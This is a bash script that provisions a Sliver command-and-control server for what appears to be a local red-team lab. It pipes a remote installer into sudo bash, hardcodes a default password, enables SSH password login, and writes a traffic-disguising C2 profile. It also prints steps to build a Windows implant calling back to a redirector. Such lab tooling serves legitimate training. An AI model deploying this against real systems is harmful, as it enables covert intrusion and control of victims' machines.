#!/bin/bash
# sliver_setup.sh - Local VM version
set -e

exec > >(tee /var/log/user-data.log)
exec 2>&1

echo "===== Sliver C2 Server Setup Started (Local VM) $(date) ====="

SSH_PASSWORD="${SSH_PASSWORD:-redStack2024!}"
REDIRECTOR_VPC_CIDR="${REDIRECTOR_VPC_CIDR:-10.60.0.0/16}"
C2_HEADER_NAME="${C2_HEADER_NAME:-X-Request-ID}"
C2_HEADER_VALUE="${C2_HEADER_VALUE:-redstack-local-dev}"

hostnamectl set-hostname sliver

cat >> /etc/hosts << HOSTS

# redStack lab hosts
${SLIVER_PRIVATE_IP:-10.50.0.11}     sliver
${GUACAMOLE_PRIVATE_IP:-10.50.0.20}  guac
${MYTHIC_PRIVATE_IP:-10.50.0.10}     mythic
${HAVOC_PRIVATE_IP:-10.50.0.12}      havoc
${REDIRECTOR_PRIVATE_IP:-10.60.0.10} redirector
${WINDOWS_PRIVATE_IP:-10.50.0.30}    windows
${KALI_PRIVATE_IP:-10.50.0.40}       kali
HOSTS

apt-get update
DEBIAN_FRONTEND=noninteractive apt-get upgrade -y

apt-get install -y curl git build-essential mingw-w64 ufw net-tools jq

echo "vagrant:$SSH_PASSWORD" | chpasswd
sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/^#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
systemctl restart sshd

ufw --force reset
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw allow from $REDIRECTOR_VPC_CIDR to any port 80 proto tcp
ufw allow from $REDIRECTOR_VPC_CIDR to any port 443 proto tcp
ufw allow 31337/tcp
ufw --force enable

if [ ! -f /swapfile ]; then
    fallocate -l 2G /swapfile
    chmod 600 /swapfile
    mkswap /swapfile
    swapon /swapfile
    echo '/swapfile none swap sw 0 0' >> /etc/fstab
fi

curl https://sliver.sh/install | sudo bash
sleep 10

if [ -f /root/sliver-server ]; then
    ln -sf /root/sliver-server /usr/local/bin/sliver-server
fi

mkdir -p /etc/systemd/system/sliver.service.d/
cat > /etc/systemd/system/sliver.service.d/umask.conf << 'UMASKCONF'
[Service]
UMask=0022
UMASKCONF

systemctl daemon-reload
systemctl enable sliver --now || true

for i in $(seq 1 30); do
    if ss -tlnp | grep -q ':31337'; then
        echo "[+] Sliver daemon ready on port 31337"
        break
    fi
    sleep 2
done

rm -rf /home/vagrant/.sliver-client/configs/
rm -rf /root/.sliver-client/configs/

sliver-server operator --name admin --lhost localhost --save /root/admin.cfg --permissions all

mkdir -p /home/vagrant/.sliver-client/configs
cp /root/admin.cfg /home/vagrant/.sliver-client/configs/admin.cfg
chown -R vagrant:vagrant /home/vagrant/.sliver-client
chmod 600 /home/vagrant/.sliver-client/configs/admin.cfg

jq -n \
  --arg header_name "$C2_HEADER_NAME" \
  --arg header_value "$C2_HEADER_VALUE" \
  '{
    "implant_config": {
      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "chrome_base_version": 120,
      "nonce_query_args": "abcdefghijklmnopqrstuvwxyz",
      "headers": [{"name": $header_name, "value": $header_value, "probability": 100}],
      "nonce_query_length": 1,
      "nonce_mode": "UrlParam",
      "max_files": 4, "min_files": 2, "max_paths": 4, "min_paths": 2,
      "max_path_length": 4, "min_path_length": 2,
      "extensions": ["js", "", "php"],
      "files": ["jquery.min", "bootstrap", "app", "main", "index", "script"],
      "paths": ["js", "assets", "scripts", "static", "dist"]
    },
    "server_config": {
      "random_version_headers": false,
      "headers": [{"name": "Cache-Control", "value": "no-store, no-cache, must-revalidate", "probability": 100, "method": "GET"}],
      "cookies": ["PHPSESSID"]
    }
  }' > /home/vagrant/redstack-c2-profile.json
chmod 644 /home/vagrant/redstack-c2-profile.json

cat > /root/sliver_quickstart.sh << 'QUICKSTART'
#!/bin/bash
echo "===== Sliver C2 Quick Start ====="
echo ""
echo "1. Connect: sliver-client"
echo ""
echo "2. Import C2 profile:"
echo "   c2profiles import --file /home/vagrant/redstack-c2-profile.json --name redstack"
echo ""
echo "3. Start HTTP listener:"
echo "   http --lhost 0.0.0.0 --lport 80"
echo ""
echo "4. Generate implant:"
echo "   generate --http http://10.60.0.10/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/implant.exe"
echo ""
echo "5. Transfer to Windows:"
echo "   scp /tmp/implant.exe vagrant@10.50.0.30:C:\\Users\\Administrator\\Desktop\\"
echo ""
echo "Multiplexer port: 31337"
QUICKSTART
chmod +x /root/sliver_quickstart.sh

echo "===== Sliver C2 Server Setup Completed $(date) ====="
